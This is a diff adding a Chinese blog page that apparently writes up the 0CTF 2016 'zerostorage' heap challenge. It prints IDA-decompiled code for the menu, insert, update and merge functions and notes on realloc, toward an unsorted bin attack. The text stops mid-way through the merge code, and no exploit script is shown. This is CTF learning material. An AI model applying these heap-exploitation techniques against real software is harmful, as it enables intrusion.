@@ -1,0 +1,520 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>0CTF复现zero - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、题目zerostorage前言：这道题是2016年的0CTF的一道pwn，带了点内核的考点在里面，主要是unsorted_bin的攻击。
+1、分析保护机制
+保护全开，ida搞一波：
+
+初始化时有,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">0CTF复现zero</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/0CTFpwn%E2%80%94zerostorage/" title="0CTF复现zero" class="">0CTF复现zero</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    53k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    48 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/unsorted-bin-attack/" rel="tag">unsorted bin attack</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h2 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h2><h3 id="zerostorage"><a href="#zerostorage" class="headerlink" title="zerostorage"></a>zerostorage</h3><p>前言：这道题是2016年的0CTF的一道pwn，带了点内核的考点在里面，主要是unsorted_bin的攻击。</p>
+<p>1、分析保护机制<br><img src="/blog_img/1567680331074.png" alt="56768033107"></p>
+<p>保护全开，ida搞一波：<a id="more"></a></p>
+<p><img src="/blog_img/1567680561736.png" alt="56768056173"></p>
+<p>初始化时有个随机数生成的函数，为后面的堆地址进行异或加密。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"== Zero Storage =="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. Insert"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. Update"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3. Merge"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4. Delete"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5. View"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"6. List"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"7. Exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"=================="</span>);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Your choice: "</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( read_0() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        insert();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        update();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        merge();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        view();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="built_in">list</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Bye"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid!"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>熟悉的菜单题，接着就是一步步分析代码找出漏洞点，这里提醒下自己，应该多做些难题，提升代码审计的能力，遇到很多很复杂的代码才不会慌。</p>
+<p>先来看下insert(malloc):</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">insert</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> number; <span class="comment">// ebx</span></span><br><span class="line">  _DWORD *ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> size_1; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> size_2; <span class="comment">// edi</span></span><br><span class="line">  __int64 chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  number = <span class="number">0</span>;</span><br><span class="line">  ptr = &amp;unk_203060;<span class="comment">//指针存在bss段中</span></span><br><span class="line">  <span class="keyword">while</span> ( *ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    ++number;</span><br><span class="line">    ptr += <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> ( number == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="string">"Unable to insert more entries."</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Length of new entry: "</span>);</span><br><span class="line">  <span class="built_in">size</span> = read_0();</span><br><span class="line">  v3 = <span class="string">"Invalid length!"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v3);</span><br><span class="line">  size_1 = <span class="number">0x1000</span>;</span><br><span class="line">  size_2 = <span class="number">0x80</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    size_1 = <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size_1 &gt;= <span class="number">0x80</span> )</span><br><span class="line">    size_2 = size_1;</span><br><span class="line">  chunk = <span class="built_in">calloc</span>(size_2, <span class="number">1u</span>LL);                 <span class="comment">// 大于0x1000，申请得到是0x1000</span></span><br><span class="line">                                                <span class="comment">// 0x80到0x1000之间，申请得到是0x80到0x1000之间</span></span><br><span class="line">                                                <span class="comment">// 小于0x80，申请得到是0x80</span></span><br><span class="line">  <span class="keyword">if</span> ( !chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Memory Error.\n"</span>, <span class="number">1u</span>LL, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Enter your data: "</span>);</span><br><span class="line">  read_data(chunk, size_1);</span><br><span class="line">  v7 = unk_203048 ^ chunk;                      <span class="comment">//堆地址用随机数进行了异或加密</span></span><br><span class="line">  v8 = &amp;unk_203060 + <span class="number">0x18</span> * number;              <span class="comment">// 通过number(idx)来确定堆地址</span></span><br><span class="line">  *v8 = <span class="number">1</span>;                                        <span class="comment">//使用标志位</span></span><br><span class="line">  *(v8 + <span class="number">1</span>) = size_1;                            <span class="comment">//输入的大小</span></span><br><span class="line">  *(v8 + <span class="number">2</span>) = v7;                               <span class="comment">// chunk的地址</span></span><br><span class="line">  ++num;                  </span><br><span class="line">  <span class="keyword">return</span> __printf_chk(<span class="number">1L</span>L, <span class="string">"New entry %d is successfully inserted.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里要知道一个知识点，calloc函数申请出来的内存会自动先清零，这样就几乎没有UAF的漏洞了。</p>
+<p>因此可以整理出一个结构体：</p>
+<p><img src="/blog_img/1567680697131.png" alt="56768069713"></p>
+<p>接着就是分析update函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 chunk; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No entries yet."</span>);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Entry ID: "</span>);</span><br><span class="line">  idx = read_0();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">31</span> || (v1 = idx, v2 = &amp;unk_203060 + <span class="number">24</span> * idx, *v2 != <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="string">"Invalid ID!"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Length of entry: "</span>);</span><br><span class="line">  <span class="built_in">size</span> = read_0();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="string">"Invalid length!"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    v6 = <span class="built_in">size</span>;</span><br><span class="line">  v7 = <span class="number">0x80</span>;</span><br><span class="line">  LODWORD(v8) = <span class="number">0x80</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt;= <span class="number">0x80</span> )</span><br><span class="line">    v7 = v6;</span><br><span class="line">  chunk = unk_203048 ^ *(v2 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(v2 + <span class="number">1</span>) &gt;= <span class="number">0x80</span>uLL )</span><br><span class="line">    v8 = *(v2 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 != v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk = <span class="built_in">realloc</span>((unk_203048 ^ *(v2 + <span class="number">2</span>)), v7);</span><br><span class="line">    <span class="keyword">if</span> ( !chunk )</span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"Memory Error.\n"</span>, <span class="number">1u</span>LL, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Enter your data: "</span>);</span><br><span class="line">  read_data(chunk, v6);</span><br><span class="line">  v10 = &amp;unk_203060 + <span class="number">24</span> * v1;</span><br><span class="line">  *(v10 + <span class="number">2</span>) = unk_203048 ^ chunk;</span><br><span class="line">  *(v10 + <span class="number">1</span>) = v6;</span><br><span class="line">  <span class="keyword">return</span> __printf_chk(<span class="number">1L</span>L, <span class="string">"Entry %d is successfully updated.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的update涉及到一个新知识，realloc(ptr，size)函数，扩展申请函数，按照size的不同，分为以下几种情况：</p>
+<p>1、size是和原来的ptr相同时，则什么也不做</p>
+<p>3、size大于原来的ptr的size时，后面有堆块隔着topchunk，就会重新申请一块size大小的堆块，然后把新的内容写进去，接着把ptr的堆块给释放掉，ptr的指针重新指向新的申请堆块的地址（没有堆块隔着topchunk时就会直接返回ptr，同时大小变为realloc中的size）</p>
+<p>4、size小于ptr大小时，收缩堆块size为realloc中要求的size，有多的部分free掉</p>
+<p>5、当size为0时，表示free(ptr)，具体介意看源码分析</p>
+<p>4、size为负数没卵用。。。别问了</p>
+<p>接着就是输入数据，然后结构体的信息存储下</p>
+<p>下面重点看下merge函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">merge</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// ebx</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx1; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">char</span> *chunk1; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx2; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *chunk2; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 chk1size; <span class="comment">// rax</span></span><br><span class="line">  __int64 chk2size; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v12; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 Zsize; <span class="comment">// r10</span></span><br><span class="line">  __int64 v14; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">char</span> *chunk22; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">size_t</span> v16; <span class="comment">// rdx</span></span><br><span class="line">  __int64 dx2; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 ZZsize; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">char</span> *ck1; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 chunk222; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v21; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> *newchunk; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *chunk1_1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> *chk2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v25; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v26; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( num &lt;= <span class="number">1u</span>LL )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not enough entries to merge."</span>);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  v1 = &amp;unk_203060;</span><br><span class="line">  <span class="keyword">while</span> ( *v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++idx;</span><br><span class="line">    v1 += <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> ( idx == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="string">"Unable to insert more entries."</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Merge from Entry ID: "</span>);</span><br><span class="line">  idx1 = read_0();</span><br><span class="line">  <span class="keyword">if</span> ( idx1 &gt; <span class="number">0x1F</span></span><br><span class="line">    || (chunk1 = &amp;unk_203060 + <span class="number">24</span> * idx1, *chunk1 != <span class="number">1</span>)</span><br><span class="line">    || (__printf_chk(<span class="number">1L</span>L, <span class="string">"Merge to Entry ID: "</span>), idx2 = read_0(), idx2 &gt; <span class="number">0x1F</span>)</span><br><span class="line">    || (v7 = idx2, chunk2 = &amp;unk_203060 + <span class="number">24</span> * idx2, *chunk2 != <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="string">"Invalid ID!"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  chk1size = *(chunk2 + <span class="number">1</span>);</span><br><span class="line">  chk2size = *(chunk1 + <span class="number">1</span>);</span><br><span class="line">  v11 = <span class="number">0x80</span>LL;</span><br><span class="line">  v12 = <span class="number">0x80</span>LL;</span><br><span class="line">  v25 = chunk2;</span><br><span class="line">  Zsize = chk2size + chk1size;</span><br><span class="line">  v14 = unk_203048;</span><br><span class="line">  <span class="keyword">if</span> ( (chk2size + chk1size) &gt;= <span class="number">0x80</span> )</span><br><span class="line">    v12 = chk2size + chk1size;</span><br><span class="line">  chunk22 = (*(chunk2 + <span class="number">2</span>) ^ unk_203048);</span><br><span class="line">  <span class="keyword">if</span> ( chk1size &gt;= <span class="number">0x80</span> )</span><br><span class="line">    v11 = *(chunk2 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 == v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = *(chunk1 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v27 = v7;</span><br><span class="line">    v26 = chk2size + chk1size;</span><br><span class="line">    chunk22 = <span class="built_in">realloc</span>((*(chunk2 + <span class="number">2</span>) ^ unk_203048), v12);</span><br><span class="line">    <span class="keyword">if</span> ( !chunk22 )</span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"Memory Error.\n"</span>, <span class="number">1u</span>LL, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = *(chunk1 + <span class="number">1</span>);</span><br><span class="line">    Zsize = v26;</span><br><span class="line">    v14 = unk_203048;</span><br><span class="line">    chk1size = *(v25 + <span class="number">1</span>);</span><br><span class="line">    v7 = v27;</span><br><span class="line">  &#125;</span><br><span class="line">  dx2 = v7;</span><br><span class="line">  ZZsize = Zsize;</span><br><span class="line">  ck1 = &amp;unk_203060 + <span class="number">24</span> * idx1;</span><br><span class="line">  chunk222 = chunk22;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;chunk22[chk1size], (*(ck1 + <span class="number">2</span>) ^ v14), v16);<span class="comment">// copy to together</span></span><br><span class="line">  v21 = unk_203048;</span><br><span class="line">  newchunk = &amp;unk_203060 + <span class="number">24</span> * idx;            <span class="comment">// 